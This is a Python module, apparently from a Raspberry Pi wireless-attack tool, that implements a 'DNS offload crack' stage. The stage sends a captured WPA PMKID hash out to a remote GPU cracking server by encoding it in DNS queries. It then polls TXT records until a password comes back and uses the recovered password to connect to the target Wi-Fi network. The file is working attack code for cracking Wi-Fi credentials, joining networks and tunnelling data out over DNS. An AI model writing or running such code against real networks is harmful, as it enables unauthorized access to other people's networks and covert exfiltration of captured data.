"""DNS offload crack stage — send PMKID to server for GPU cracking via DNS.

When the Pi captures a PMKID but can't crack it locally (slow CPU, small
wordlist), and DNS is reachable, this stage encodes the hash in DNS
queries and sends it to a powerful server for cracking.  It then polls
for results via TXT records.

No full internet connection needed — only DNS port 53 reachability.

Requires consent (sends captured network data to an external server).
"""

import time

from logging_config import get_logger
from vasili import PipelineStage, StageResult
import network_isolation

logger = get_logger(__name__)


class DnsOffloadCrackStage(PipelineStage):
    """Offload PMKID cracking to a remote server via DNS exfiltration."""

    name = 'dns_offload_crack'
    requires_consent = True

    _stage_config: dict | None = None

    def can_run(self, network, card, context):
        # Need a captured but uncracked PMKID
        if not context.get('pmkid_captured'):
            return False
        if context.get('pmkid_cracked'):
            return False
        if context.get('has_internet'):
            return False
        # Need the raw hash line from PmkidCaptureStage
        if not context.get('_pmkid_hash_line'):
            return False
        # Need DNS reachability
        if not (context.get('dns_reachable_tcp') or
                context.get('dns_reachable_udp')):
            return False
        # Need offload domain configured
        cfg = self._get_stage_config()
        if not cfg.get('offload_domain'):
            return False
        if not cfg.get('offload_secret'):
            return False
        return True

    def run(self, network, card, context):
        from modules.helpers.dns_offload import DnsOffloadClient

        cfg = self._get_stage_config()
        hash_line = context['_pmkid_hash_line']

        # Parse the hash line: WPA*02*pmkid*mac_ap*mac_sta*essid_hex*...
        parts = hash_line.split('*')
        if len(parts) < 6:
            return StageResult(
                success=False, has_internet=False,
                context_updates={},
                message='Invalid PMKID hash format',
            )

        pmkid_hex = parts[2]
        mac_ap = parts[3]
        mac_sta = parts[4]
        essid_hex = parts[5]

        # Pick a reachable DNS server as our relay
        dns_servers = context.get('reachable_dns_servers', [])
        nameserver = dns_servers[0].split(':')[0] if dns_servers else '8.8.8.8'
        source_ip = network_isolation.get_interface_ip(card.interface)

        client = DnsOffloadClient(
            domain=cfg['offload_domain'],
            secret=cfg['offload_secret'],
            nameserver=nameserver,
            source_ip=source_ip,
            timeout=cfg.get('timeout', 5),
        )

        # Submit the job
        logger.info('Submitting PMKID to crack server via DNS')
        job_id = client.submit_pmkid(pmkid_hex, mac_ap, mac_sta, essid_hex)
        if not job_id:
            return StageResult(
                success=False, has_internet=False,
                context_updates={},
                message='Crack server rejected submission or unreachable',
            )

        # Poll for result
        poll_interval = cfg.get('poll_interval', 10)
        poll_timeout = cfg.get('poll_timeout', 300)
        deadline = time.time() + poll_timeout

        logger.info('Polling crack server for job %s (timeout %ds)',
                     job_id, poll_timeout)

        password = None
        while time.time() < deadline:
            time.sleep(poll_interval)

            result = client.poll_status(job_id)
            status = result.get('status', '')

            if status == 'found':
                password = result['password']
                logger.info('Crack server found password: %s', password)
                break
            elif status == 'exhausted':
                logger.info('Crack server exhausted wordlist for %s', job_id)
                return StageResult(
                    success=False, has_internet=False,
                    context_updates={'offload_submitted': True,
                                     'offload_exhausted': True},
                    message='Server-side cracking exhausted wordlist',
                )
            elif status == 'working':
                pct = result.get('progress', 0)
                logger.debug('Crack server working: %d%%', pct)
            elif status == 'error':
                logger.warning('Poll error — retrying')
            # else: queued, unknown — keep polling

        if not password:
            return StageResult(
                success=False, has_internet=False,
                context_updates={'offload_submitted': True},
                message=f'Crack server timed out after {poll_timeout}s',
            )

        # Password found — try to connect
        card.ensure_managed()
        time.sleep(1)

        if card.connect(network, password=password):
            has_internet = network_isolation.verify_connectivity(card.interface)
            return StageResult(
                success=True, has_internet=has_internet,
                context_updates={
                    'pmkid_cracked': True,
                    'has_internet': has_internet,
                    'connected_with': 'dns_offload_crack',
                    'offload_submitted': True,
                },
                message='Server cracked PMKID and connected' + (
                    ' — internet OK' if has_internet else ' — no internet'
                ),
            )
        else:
            return StageResult(
                success=False, has_internet=False,
                context_updates={
                    'pmkid_cracked': True,
                    'offload_submitted': True,
                },
                message='Server found password but connection failed',
            )

    def _get_stage_config(self) -> dict:
        if self._stage_config is not None:
            return self._stage_config
        schema = self.get_config_schema()
        self._stage_config = {k: v['default'] for k, v in schema.items()}
        return self._stage_config

    def get_config_schema(self):
        return {
            'offload_domain': {
                'type': 'str',
                'default': '',
                'description': 'DNS domain for crack server (e.g. crack.example.com)',
            },
            'offload_secret': {
                'type': 'str',
                'default': '',
                'description': 'Shared secret for crack server authentication',
            },
            'poll_interval': {
                'type': 'int',
                'default': 10,
                'description': 'Seconds between status polls',
            },
            'poll_timeout': {
                'type': 'int',
                'default': 300,
                'description': 'Max seconds to wait for crack result',
            },
            'timeout': {
                'type': 'int',
                'default': 5,
                'description': 'DNS query timeout in seconds',
            },
        }
